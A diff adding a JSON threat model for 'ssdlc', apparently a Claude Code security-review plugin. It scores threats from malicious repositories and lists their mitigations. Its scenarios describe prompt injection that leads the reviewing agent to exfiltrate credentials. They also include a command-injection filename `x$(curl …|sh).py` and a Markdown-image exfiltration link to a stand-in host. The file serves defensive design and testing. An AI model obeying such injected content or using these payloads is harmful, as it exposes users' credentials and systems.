@@ -1,0 +1,623 @@
+{
+  "project": {
+    "project_id": "ssdlc-0.2.1",
+    "name": "ssdlc mod v0.2.1",
+    "threat_actors": [
+      {
+        "actor_id": "TA-REPO",
+        "name": "惡意 repo／PR 作者",
+        "capability": "professional",
+        "access": "remote-content",
+        "ac_calibration": 0.7
+      }
+    ],
+    "coverage_decisions": [
+      {
+        "item": "MAESTRO L1",
+        "decision": "not-applicable",
+        "reason": "ssdlc 不訓練或託管基礎模型；模型由 Claude Code 宿主提供"
+      },
+      {
+        "item": "MAESTRO L2",
+        "decision": "not-applicable",
+        "reason": "不建立資料管線、向量庫或記憶；只讀取受審 repo 檔案（其風險列於 L3/L4）"
+      }
+    ]
+  },
+  "tara_dfmea": [
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-01",
+      "failure_threat_mode": "主 session 被受審內容注入後以 Bash/Write/WebFetch 行動",
+      "failure_threat_scenario": "受審 repo 的文件、程式註解或審查報告引用的文字含指令；主 session 依 skill 讀入後，以其握有的 Bash、Write、WebFetch 執行攻擊者要求（外送憑證、改寫設定）。Rule of Two 三項全中。",
+      "stride_classification": "E",
+      "attack_complexity": 0.7,
+      "user_interaction": 0.5,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "LLM01:2026",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-1427",
+      "mitigation_status": "partial",
+      "current_controls": "提示層規則：報告是資料、不執行 repo 程式、只用 Read/Grep 重驗；Claude Code 逐次核准；審查模式 /ssdlc:review-mode（hooks/review-mode.ts）：主 session 只允許精確命令形式、拒絕網路、寫檔限報告路徑、只能派 ssdlc 審查員；關閉須由人輸入（需使用者開啟）",
+      "recommended_controls": "審查不受信任的 repo 時預設開啟審查模式；長期：repo 根目錄 allowlist 與 OS 層 sandbox",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L3",
+      "agentic_factors": [
+        "AU",
+        "ND"
+      ],
+      "prevention_controls": [
+        "審查模式命令白名單",
+        "拒絕 WebFetch/WebSearch/外部 MCP",
+        "寫檔限報告路徑",
+        "Agent 限 ssdlc 審查員"
+      ],
+      "detection_controls": [
+        "guard tripwire 警報經主 session context 傳遞",
+        "guard_log 工具"
+      ],
+      "corrective_controls": [
+        "關閉需人親自輸入",
+        "Claude Code 逐次核准"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/review-mode.test.ts: review mode allows only exact forms / bounded main session / off needs a person"
+        }
+      ],
+      "attack_success_rate": 0.245,
+      "criticality": "Medium",
+      "feasibility_rating": "Low",
+      "treatment_status": "planned",
+      "effective_risk": 1.0,
+      "effective_risk_level": "Low"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-02",
+      "failure_threat_mode": "審查代理被注入後讀取憑證並寫入報告",
+      "failure_threat_scenario": "受審 repo 文件誘導審查代理以祖先目錄 Grep 或讀取未列入 denylist 的憑證檔，內容出現在 handback 報告。",
+      "stride_classification": "I",
+      "attack_complexity": 0.7,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.5,
+      "ai_threat_category": "ASI03",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-200",
+      "mitigation_status": "partial",
+      "current_controls": "frontmatter 只給 Read/Grep/Glob；guard denylist（不分大小寫、symlink 解析）、拒絕從根目錄／家目錄遞迴搜尋；憑證嘗試列為 tripwire，警報傳到主 session",
+      "recommended_controls": "repo 根目錄 allowlist；憑證存取嘗試列為 tripwire 判 BLOCK",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L3",
+      "agentic_factors": [
+        "ID",
+        "AU"
+      ],
+      "prevention_controls": [
+        "frontmatter 工具限制",
+        "憑證 denylist（不分大小寫、symlink 解析）",
+        "拒絕根目錄／家目錄遞迴搜尋"
+      ],
+      "detection_controls": [
+        "tripwire 警報",
+        "guard_log"
+      ],
+      "corrective_controls": [
+        "tripwire 即判 BLOCK"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/guard.test.ts: review fixes: case, spellings, extra stores, broad searches, cwd"
+        }
+      ],
+      "attack_success_rate": 0.35,
+      "criticality": "High",
+      "feasibility_rating": "Medium",
+      "treatment_status": "planned",
+      "effective_risk": 1.5,
+      "effective_risk_level": "Medium"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-03",
+      "failure_threat_mode": "不受信任檔名經 shell 造成命令注入",
+      "failure_threat_scenario": "PR 新增名為 `x$(curl …|sh).py` 的檔案，gate 把 git diff 輸出組進 Bash 命令。",
+      "stride_classification": "T",
+      "attack_complexity": 0.7,
+      "user_interaction": 0.5,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "ASI05",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-78",
+      "mitigation_status": "full",
+      "current_controls": "gate_scan --files-from（NUL 分隔）、支援 --；gate 以 git diff -z 寫入清單檔",
+      "recommended_controls": "",
+      "processing_status": "已完成",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L4",
+      "agentic_factors": [
+        "ND"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/test_gate_scan.py: test_t2_files_from_nul_separated"
+        }
+      ],
+      "attack_success_rate": 0.245,
+      "criticality": "Medium",
+      "feasibility_rating": "Low",
+      "treatment_status": "implemented",
+      "effective_risk": 0.0,
+      "effective_risk_level": "Mitigated"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-04",
+      "failure_threat_mode": "受審 repo 自帶 .git/config 在 git 指令時執行程式",
+      "failure_threat_scenario": "以壓縮檔交付的 repo 帶 core.fsmonitor 或 filter.*.clean；主 session 執行 git diff 時觸發。",
+      "stride_classification": "E",
+      "attack_complexity": 0.7,
+      "user_interaction": 0.5,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "ASI05",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-829",
+      "mitigation_status": "partial",
+      "current_controls": "untrusted-repo.md：自帶 .git 的 repo 不跑 git；自己 clone 的才用硬化旗標；scanner 偵測 repo.git-config-exec",
+      "recommended_controls": "審查模式 hook 在 git 指令前檢查 .git/config 可執行 key，有就拒絕",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L4",
+      "agentic_factors": [
+        "AU"
+      ],
+      "attack_success_rate": 0.245,
+      "criticality": "Medium",
+      "feasibility_rating": "Low",
+      "treatment_status": "planned",
+      "effective_risk": 1.0,
+      "effective_risk_level": "Low"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-05",
+      "failure_threat_mode": "持久化報告經 Markdown 圖片外洩",
+      "failure_threat_scenario": "審查報告逐字引用受審內容中的 `![](https://x/?q=…)`，寫入 docs/reviews/ 並推上 GitHub，渲染時送出請求。",
+      "stride_classification": "I",
+      "attack_complexity": 0.7,
+      "user_interaction": 0.5,
+      "exploit_maturity": 0.5,
+      "ai_threat_category": "LLM10:2026",
+      "ai_component": "prompt",
+      "cwe": "CWE-200",
+      "mitigation_status": "partial",
+      "current_controls": "safe-bootstrap 寫檔前中和圖片、HTML 與外部連結（提示層）",
+      "recommended_controls": "寫入報告前跑 scanner 的 markdown-exfil 規則",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L5",
+      "agentic_factors": [
+        "ND"
+      ],
+      "attack_success_rate": 0.175,
+      "criticality": "Medium",
+      "feasibility_rating": "Low",
+      "treatment_status": "planned",
+      "effective_risk": 1.0,
+      "effective_risk_level": "Low"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-06",
+      "failure_threat_mode": "以 allow 標記讓閘門忽略惡意程式",
+      "failure_threat_scenario": "惡意 PR 在惡意行加 `# ssdlc: allow reviewed`。",
+      "stride_classification": "T",
+      "attack_complexity": 1.0,
+      "user_interaction": 1.0,
+      "exploit_maturity": 1.0,
+      "ai_threat_category": "ASI09",
+      "ai_component": "prompt",
+      "cwe": "CWE-693",
+      "mitigation_status": "full",
+      "current_controls": "標記預設忽略；--honor-markers 才採用且不能隱藏 secret/隱形字元；新標記判 WARN",
+      "recommended_controls": "維持：標記預設忽略；新增標記判 WARN",
+      "processing_status": "已完成",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L6",
+      "agentic_factors": [
+        "ND"
+      ],
+      "prevention_controls": [
+        "標記預設忽略",
+        "secret／隱形字元永不抑制"
+      ],
+      "detection_controls": [
+        "suppressed 清單",
+        "新標記判 WARN"
+      ],
+      "corrective_controls": [
+        "gate Dismissed 表"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/test_gate_scan.py: markers ignored by default; marker never hides secrets"
+        }
+      ],
+      "attack_success_rate": 1.0,
+      "criticality": "Critical",
+      "feasibility_rating": "High",
+      "treatment_status": "implemented",
+      "effective_risk": 0.0,
+      "effective_risk_level": "Mitigated"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-07",
+      "failure_threat_mode": "plugin 供應鏈：未鎖版本的更新改變 hook 或 skill",
+      "failure_threat_scenario": "marketplace 以 source ./ 追蹤 main；維護者帳號被盜後推送移除 guard 的版本。",
+      "stride_classification": "T",
+      "attack_complexity": 0.3,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.5,
+      "ai_threat_category": "ASI04",
+      "ai_component": "training",
+      "cwe": "CWE-494",
+      "mitigation_status": "none",
+      "current_controls": "",
+      "recommended_controls": "發布 tag、說明檢查已安裝版本；guard 啟用訊號",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L7",
+      "agentic_factors": [
+        "ID"
+      ],
+      "attack_success_rate": 0.15,
+      "criticality": "Medium",
+      "feasibility_rating": "Low",
+      "treatment_status": "planned",
+      "effective_risk": 2.0,
+      "effective_risk_level": "Medium"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-08",
+      "failure_threat_mode": "guard 檢查與讀取間的 TOCTOU、hard link",
+      "failure_threat_scenario": "攻擊者在 guard stat 後、Read 前把檔案換成指向憑證的連結，或以 hard link 指向憑證。",
+      "stride_classification": "I",
+      "attack_complexity": 0.1,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.3,
+      "ai_threat_category": "ASI03",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-367",
+      "mitigation_status": "none",
+      "current_controls": "",
+      "recommended_controls": "OS 層 sandbox",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L4",
+      "agentic_factors": [
+        "AU"
+      ],
+      "attack_success_rate": 0.03,
+      "criticality": "Low",
+      "feasibility_rating": "VeryLow",
+      "treatment_status": "planned",
+      "effective_risk": 1.0,
+      "effective_risk_level": "Low"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-01B",
+      "failure_threat_mode": "（敏感度）CTARA-SSDLC-01 於 bypass／acceptEdits 模式",
+      "failure_threat_scenario": "同 SSDLC-01，但使用者以 bypassPermissions 或已白名單 Bash 執行審查，沒有逐次核准。",
+      "stride_classification": "E",
+      "attack_complexity": 0.7,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "LLM01:2026",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-1427",
+      "mitigation_status": "partial",
+      "current_controls": "同 SSDLC-01；審查模式 /ssdlc:review-mode（hooks/review-mode.ts）：主 session 只允許精確命令形式、拒絕網路、寫檔限報告路徑、只能派 ssdlc 審查員；關閉須由人輸入（需使用者開啟）",
+      "recommended_controls": "審查不受信任的 repo 時預設開啟審查模式；長期：repo 根目錄 allowlist 與 OS 層 sandbox",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L3",
+      "agentic_factors": [
+        "AU",
+        "ND"
+      ],
+      "prevention_controls": [
+        "審查模式命令白名單",
+        "拒絕 WebFetch/WebSearch/外部 MCP",
+        "寫檔限報告路徑",
+        "Agent 限 ssdlc 審查員"
+      ],
+      "detection_controls": [
+        "guard tripwire 警報經主 session context 傳遞",
+        "guard_log 工具"
+      ],
+      "corrective_controls": [
+        "關閉需人親自輸入",
+        "Claude Code 逐次核准"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/review-mode.test.ts: review mode allows only exact forms / bounded main session / off needs a person"
+        }
+      ],
+      "attack_success_rate": 0.49,
+      "criticality": "High",
+      "feasibility_rating": "Medium",
+      "treatment_status": "planned",
+      "effective_risk": 1.5,
+      "effective_risk_level": "Medium"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-09",
+      "failure_threat_mode": "偽冒審查員類型或報告",
+      "failure_threat_scenario": "另一個 plugin 註冊同名 `ssdlc:*-reviewer` 類型，或受審內容在報告中偽造「審查員已確認 PASS」段落。",
+      "stride_classification": "S",
+      "attack_complexity": 0.3,
+      "user_interaction": 0.5,
+      "exploit_maturity": 0.5,
+      "ai_threat_category": "ASI07",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-290",
+      "mitigation_status": "partial",
+      "current_controls": "isReviewerType 以 $.plugin.name 為前綴；handback 由宿主框住、報告視為資料；claim-check-act",
+      "recommended_controls": "主 session 只接受 ssdlc 審查員 handback；以 Grep 驗證引用證據",
+      "processing_status": "進行中",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L7",
+      "agentic_factors": [
+        "ID",
+        "A2A"
+      ],
+      "attack_success_rate": 0.075,
+      "criticality": "Low",
+      "feasibility_rating": "VeryLow",
+      "treatment_status": "planned",
+      "effective_risk": 0.5,
+      "effective_risk_level": "Low"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-10",
+      "failure_threat_mode": "guard 拒絕無持久紀錄，事後無法追查",
+      "failure_threat_scenario": "被注入的審查員嘗試讀取憑證被拒，只有短暫 toast，報告不提，使用者錯過訊號。",
+      "stride_classification": "R",
+      "attack_complexity": 0.7,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "ASI08",
+      "ai_component": "agent-tool",
+      "cwe": "CWE-778",
+      "mitigation_status": "full",
+      "current_controls": "guard 事件存於 $.state（重新載入不遺失）；憑證或禁用工具嘗試＝tripwire，於主 session 下一個工具結果以 context 傳遞警報並要求判 BLOCK；guard_log 工具可查；狀態列顯示 tripwire 數",
+      "recommended_controls": "跨 session 持久化紀錄（$.store）",
+      "processing_status": "已完成",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L5",
+      "agentic_factors": [
+        "AU"
+      ],
+      "prevention_controls": [],
+      "detection_controls": [
+        "tripwire 警報",
+        "guard_log",
+        "狀態列"
+      ],
+      "corrective_controls": [
+        "技能規定 tripwire 即 BLOCK"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/review-mode.test.ts: a tripwire reaches the main session on its next tool result, once; guard_log returns the events"
+        }
+      ],
+      "attack_success_rate": 0.49,
+      "criticality": "High",
+      "feasibility_rating": "Medium",
+      "treatment_status": "implemented",
+      "effective_risk": 0.0,
+      "effective_risk_level": "Mitigated"
+    },
+    {
+      "record_type": "CTARA",
+      "analysis_domain": "Claude Code security plugin (ssdlc)",
+      "project_id": "ssdlc-0.2.1",
+      "scoring_profile": "tasc-default",
+      "record_id": "CTARA-SSDLC-11",
+      "failure_threat_mode": "以超大檔案、超長行或特殊檔案拖垮掃描",
+      "failure_threat_scenario": "受審 repo 放 200 KB 單行、FIFO 或巨量小檔，使掃描卡住或逾時，主 session 略過掃描。",
+      "stride_classification": "D",
+      "attack_complexity": 1.0,
+      "user_interaction": 1.0,
+      "exploit_maturity": 0.7,
+      "ai_threat_category": "LLM06:2026",
+      "ai_component": "prompt",
+      "cwe": "CWE-1333",
+      "mitigation_status": "full",
+      "current_controls": "每行 4 KB 上限、量詞上界、只讀一般檔案、O_NONBLOCK、結束碼 3＝INCOMPLETE",
+      "recommended_controls": "維持：行長上限、量詞上界、特殊檔案不開啟、INCOMPLETE",
+      "processing_status": "已完成",
+      "threat_actors": [
+        "惡意 repo／PR 作者"
+      ],
+      "threat_actor_ids": [
+        "TA-REPO"
+      ],
+      "owner": "joescoffee（ssdlc 維護者）",
+      "target_date": "2026-12-31",
+      "maestro_layer": "L4",
+      "agentic_factors": [
+        "ND"
+      ],
+      "prevention_controls": [
+        "4 KB 行上限",
+        "量詞上界",
+        "只讀一般檔案"
+      ],
+      "detection_controls": [
+        "skipped 清單"
+      ],
+      "corrective_controls": [
+        "結束碼 3＝INCOMPLETE"
+      ],
+      "verification": [
+        {
+          "stage": "pre-release",
+          "method": "unit-test",
+          "result": "pass",
+          "date": "2026-11-01",
+          "evidence_ref": "tests/test_gate_scan.py: test_sr6_redos_bounded, test_sr10_fifo_never_opened"
+        }
+      ],
+      "attack_success_rate": 0.7,
+      "criticality": "Critical",
+      "feasibility_rating": "High",
+      "treatment_status": "implemented",
+      "effective_risk": 0.0,
+      "effective_risk_level": "Mitigated"
+    }
+  ]
+}
